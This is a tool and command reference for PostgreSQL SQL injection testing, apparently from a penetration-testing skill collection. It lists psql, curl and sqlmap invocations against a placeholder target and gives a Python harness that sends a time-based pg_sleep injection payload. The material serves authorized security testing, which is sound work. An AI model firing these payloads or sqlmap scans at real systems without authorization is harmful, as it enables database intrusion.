# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-postgres-variants`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `psql` | `psql "$DSN" -c "SELECT current_setting('is_superuser');"` | Confirm whether the application role is privileged before claiming COPY or large-object impact | Linux, macOS, Windows |
| `curl` | `curl -sS -o /dev/null -w '%{http_code} %{time_total}\n' 'https://target.example/orders?status=open'` | Capture status and elapsed time for the benign literal as the Postgres timing baseline | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/orders?status=open' --dbms=postgresql --technique=BE --level=1 --risk=1 --batch` | Scope confirmation to PostgreSQL boolean and error techniques, avoiding stacked and file primitives | Linux, Windows, macOS |

## Minimal Script Shape

A pg_sleep timing harness: it takes the minimum of three control runs as the baseline and compares it against a delay-keyed probe, reporting time-blind injection only on a clear gap.

```python
import time
import urllib.parse
import urllib.request

BASE = "https://target.example/orders"

def elapsed(status_value):
    url = BASE + "?" + urllib.parse.urlencode({"status": status_value})
    start = time.perf_counter()
    with urllib.request.urlopen(url, timeout=20) as r:
        r.read()
    return time.perf_counter() - start

baseline = min(elapsed("open") for _ in range(3))
probe = min(elapsed("open' AND 1=(SELECT 1 FROM pg_sleep(2)) --") for _ in range(3))
print({"baseline_s": round(baseline, 2), "probe_s": round(probe, 2),
       "time_blind": probe - baseline > 1.5})
```
